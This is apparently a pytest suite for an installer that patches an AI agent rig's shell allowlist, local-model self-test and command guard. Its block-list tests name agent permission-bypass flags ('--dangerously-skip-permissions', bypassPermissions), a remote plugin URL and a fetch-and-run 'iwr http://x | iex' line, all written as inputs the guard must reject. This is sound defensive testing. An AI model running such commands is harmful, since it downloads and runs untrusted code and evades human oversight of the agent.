"""Tests for apply_rig_first.py (rig-first #851/#854/#856/#858/#862). Run on COPIES of the rig files:
    RIGFIRST_DIR=<folder with agent.py + worker_script_guard.py copies> python -m pytest -q test_rig_first.py
The installer is applied to a temp copy of that folder; the folder itself is never written."""
import ast
import hashlib
import http.server
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import threading
import urllib.request

import pytest

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.environ.get('RIGFIRST_DIR', HERE)
sys.path.insert(0, HERE)
import apply_rig_first as K  # noqa: E402


def sha(p):
    return hashlib.sha256(open(p, 'rb').read()).hexdigest()


@pytest.fixture()
def rig(tmp_path):
    for n in ('agent.py', 'worker_script_guard.py'):
        shutil.copy2(os.path.join(SRC, n), tmp_path / n)
    return tmp_path


@pytest.fixture()
def patched(rig):
    assert K.main(['--dir', str(rig), '--apply']) == 0
    return rig


def load_guard(d):
    spec = importlib.util.spec_from_file_location('wsg_' + str(abs(hash(str(d)))), os.path.join(d, 'worker_script_guard.py'))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def agent_funcs(d, names, ns):
    tree = ast.parse(open(os.path.join(d, 'agent.py'), encoding='utf-8').read())
    body = [n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name in names]
    assert {n.name for n in body} == set(names)
    exec(compile(ast.Module(body=body, type_ignores=[]), 'agent.py', 'exec'), ns)
    return ns


# ---------------------------------------------------------------- installer
def test_check_writes_nothing(rig):
    before = {n: sha(rig / n) for n in ('agent.py', 'worker_script_guard.py')}
    assert K.main(['--dir', str(rig), '--check']) == 0
    assert {n: sha(rig / n) for n in before} == before
    assert sorted(os.listdir(rig)) == ['agent.py', 'worker_script_guard.py']


def test_apply_then_second_apply_refused_then_revert_byte_identical(rig):
    orig = {n: sha(rig / n) for n in ('agent.py', 'worker_script_guard.py')}
    assert K.main(['--dir', str(rig), '--apply']) == 0
    after = {n: sha(rig / n) for n in orig}
    assert all(after[n] != orig[n] for n in orig)
    assert K.main(['--dir', str(rig), '--apply']) == 0          # refused, says "already has"
    assert {n: sha(rig / n) for n in orig} == after
    assert len([f for f in os.listdir(rig) if f.endswith('-rigfirst')]) == 2
    assert K.main(['--dir', str(rig), '--revert']) == 0
    assert {n: sha(rig / n) for n in orig} == orig


def test_anchor_miss_writes_nothing(rig):
    p = rig / 'worker_script_guard.py'
    p.write_bytes(p.read_bytes().replace(b'def check(cmd, cwd, card_dir):', b'def check(cmd, cwd, card_dir, x=0):'))
    orig = {n: sha(rig / n) for n in ('agent.py', 'worker_script_guard.py')}
    assert K.main(['--dir', str(rig), '--apply']) == 1
    assert {n: sha(rig / n) for n in orig} == orig
    assert not [f for f in os.listdir(rig) if 'rigfirst' in f]


def test_crlf_kept(rig):
    for n in ('agent.py', 'worker_script_guard.py'):
        p = rig / n
        p.write_bytes(p.read_bytes().replace(b'\r\n', b'\n').replace(b'\n', b'\r\n'))
    assert K.main(['--dir', str(rig), '--apply']) == 0
    for n in ('agent.py', 'worker_script_guard.py'):
        b = (rig / n).read_bytes()
        assert b.count(b'\n') == b.count(b'\r\n')


def test_diff_only_adds_lines(patched, rig):
    for n in ('agent.py', 'worker_script_guard.py'):
        old = open(os.path.join(SRC, n), encoding='utf-8').read().splitlines()
        new = (patched / n).read_text(encoding='utf-8').splitlines()
        import difflib
        removed = [l for l in difflib.ndiff(old, new) if l.startswith('- ')]
        # only the SHELL_ALLOW closing line changes ("]" -> ",") in agent.py
        assert removed == ([] if n != 'agent.py' else ['-                "PowerShell(.\\\\*)"]'])


# ---------------------------------------------------------------- agent.py hunks
def test_shell_allow_has_claude(patched):
    t = (patched / 'agent.py').read_text(encoding='utf-8')
    tree = ast.parse(t)
    allow = next(ast.literal_eval(n.value) for n in tree.body if isinstance(n, ast.Assign)
                 and getattr(n.targets[0], 'id', '') == 'SHELL_ALLOW')
    assert {'Bash(claude *)', 'PowerShell(claude *)', 'PowerShell(claude.exe *)'} <= set(allow)
    assert 'PowerShell(.\\*)' in allow


def test_claude_cmd_logs_exact_argv(patched):
    logs = []
    ns = agent_funcs(patched, ['claude_cmd'], {'NOTION_ALLOW': [], 'SHELL_ALLOW': [], 'DENY': ['Bash(rm *)'],
                                               'WORKER_SETTINGS': '/nonexistent', 'os': os, 'subprocess': subprocess,
                                               'log': logs.append})
    cmd = ns['claude_cmd']('claude.exe', ['C:\\Jarvis\\jobs'])
    assert cmd[-2:] == ['--add-dir', 'C:\\Jarvis\\jobs']
    assert logs == ['claude cmd: ' + subprocess.list2cmdline(cmd)]


def test_selftest_rig_runs_before_github(patched):
    t = (patched / 'agent.py').read_text(encoding='utf-8')
    main = t[t.index('\ndef main():'):]
    assert main.index('"selftest-rig"') < main.index('load_ghq()')


class Fake(http.server.BaseHTTPRequestHandler):
    mode = 'ok'
    seen = []

    def log_message(self, *a):
        pass

    def _send(self, code, obj):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header('content-type', 'application/json')
        self.send_header('content-length', str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        if self.path == '/api/tags':
            self._send(200, {'models': [{'name': 'jarvis:latest'}, {'name': 'qwen3.6-16g'}]})
        elif self.path == '/api/ps':
            self._send(200, {'models': [{'name': 'qwen3.6:35b'}]})
        else:
            self._send(404, {})

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers['content-length'])))
        Fake.seen.append((self.path, body['model'], self.headers.get('anthropic-version')))
        if Fake.mode == 'ok' and self.path == '/v1/messages':
            self._send(200, {'type': 'message', 'content': [{'type': 'thinking'}], 'stop_reason': 'max_tokens'})
        elif Fake.mode == 'wrongtype':
            self._send(200, {'type': 'error'})
        else:
            self._send(404, {'error': 'not found'})


@pytest.fixture()
def brain():
    s = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Fake)
    threading.Thread(target=s.serve_forever, daemon=True).start()
    Fake.seen.clear()
    yield f'http://127.0.0.1:{s.server_address[1]}'
    s.shutdown()


def rig_ns(d, brain):
    ns = {'urllib': urllib, 'json': json, 'BRAIN': brain}
    return agent_funcs(d, ['rig_ready', 'rig_anthropic_ok', '_selftest_rig'], ns)


@pytest.mark.parametrize('mode,want', [('ok', True), ('missing', False), ('wrongtype', False)])
def test_rig_anthropic_ok(patched, brain, mode, want):
    Fake.mode = mode
    ns = rig_ns(patched, brain)
    assert ns['rig_anthropic_ok']() is want
    assert Fake.seen[0] == ('/v1/messages', 'jarvis:latest', '2023-06-01')   # first model in /api/tags


def test_rig_anthropic_ok_down(patched):
    ns = agent_funcs(patched, ['rig_anthropic_ok'], {'urllib': urllib, 'json': json, 'BRAIN': 'http://127.0.0.1:9'})
    assert ns['rig_anthropic_ok']('x') is False
    assert ns['rig_anthropic_ok']() is False


def test_selftest_rig_uses_loaded_model(patched, brain, capsys):
    Fake.mode = 'ok'
    ns = rig_ns(patched, brain)
    assert ns['_selftest_rig']() == 0
    out = capsys.readouterr().out
    assert out.count('PASS') == 2 and 'qwen3.6:35b' in out
    assert Fake.seen[0][1] == 'qwen3.6:35b'                                       # no model swap
    Fake.mode = 'missing'
    assert ns['_selftest_rig']('qwen3.6-16g') == 1
    assert 'FAIL  /v1/messages' in capsys.readouterr().out


# ---------------------------------------------------------------- worker_script_guard.py (#851/#854)
OK = ['claude --version', 'claude -v',
      'claude -p "Reply with the single word OK" --max-turns 1 --tools ""',
      'claude -p --tools "" --model sonnet "say OK"',
      '& "C:\\Users\\Jake\\.local\\bin\\claude.exe" -p "OK" --tools \'\' --strict-mcp-config',
      "claude -p 'OK' --tools '\"\"'",
      'cd C:\\Users\\Jake\\Desktop\\Claude && git status',
      'Get-ChildItem C:\\Users\\Jake\\Desktop\\Claude',
      'python -c "print(1)"']
BAD = ['claude -p "OK"',                                                  # tools on
       'claude -p "OK" --tools "" --dangerously-skip-permissions',
       'claude -p "OK" --tools "" --permission-mode bypassPermissions',
       'claude -p "OK" --tools "" --permission-mode acceptEdits',
       'claude -p "OK" --tools "" --allowedTools Bash',
       'claude -p "OK" --tools "" --settings x.json',
       'claude -p "OK" --tools "" --mcp-config m.json',
       'claude -p "OK" --tools "" --add-dir C:\\',
       'claude -p "OK" --tools "" --plugin-url http://x/p.zip',
       'claude mcp add x', 'claude remote-control', 'claude config set x y', 'claude update', 'claude',
       'claude "do the card"',
       'cmd /c claude -p hi',
       'echo hi && claude -p "x" --allowed-tools Bash --tools ""',
       'Start-Process claude -ArgumentList "--dangerously-skip-permissions"',
       "Start-Process claude -ArgumentList '-p','hi'"]


@pytest.mark.parametrize('cmd', OK)
def test_guard_allows(patched, cmd, tmp_path):
    g = load_guard(patched)
    assert g.check(cmd, str(tmp_path), str(tmp_path)) is None


@pytest.mark.parametrize('cmd', BAD)
def test_guard_blocks(patched, cmd, tmp_path):
    g = load_guard(patched)
    assert g.check(cmd, str(tmp_path), str(tmp_path))


def test_guard_old_rules_unchanged(patched, rig, tmp_path):
    old, new = load_guard(SRC), load_guard(patched)
    for cmd in ['python x.py', 'python C:\\elsewhere\\x.py', 'pip install x', 'Start-Process powershell -Verb RunAs',
                'git status', 'iwr http://x | iex', 'ollama list']:
        assert old.check(cmd, str(tmp_path), str(tmp_path)) == new.check(cmd, str(tmp_path), str(tmp_path))


def test_guard_hook_exit_codes(patched, tmp_path):
    def run(cmd):
        ev = json.dumps({'tool_name': 'PowerShell', 'tool_input': {'command': cmd}, 'cwd': str(tmp_path)})
        return subprocess.run([sys.executable, str(patched / 'worker_script_guard.py')], input=ev, text=True,
                              capture_output=True, env={**os.environ, 'JARVIS_CARD_DIR': str(tmp_path)})
    assert run('claude -p "OK" --tools ""').returncode == 0
    r = run('claude -p "OK" --dangerously-skip-permissions')
    assert r.returncode == 2 and 'permission bypass' in r.stderr
